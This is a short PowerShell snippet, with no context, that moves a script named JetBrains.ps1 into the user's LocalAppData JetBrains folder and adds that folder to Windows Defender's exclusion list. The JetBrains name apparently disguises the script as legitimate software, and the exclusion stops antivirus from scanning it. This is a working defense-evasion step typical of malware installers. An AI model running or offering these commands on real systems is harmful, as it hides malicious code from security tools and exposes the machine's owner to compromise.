$Location = "$env:LOCALAPPDATA\JetBrains\JetBrains.ps1"
Move-Item -Path ".\JetBrains.ps1" -Destination $Location
$exclusions = "$env:LOCALAPPDATA\JetBrains"
Set-MpPreference -ExclusionPath $exclusions
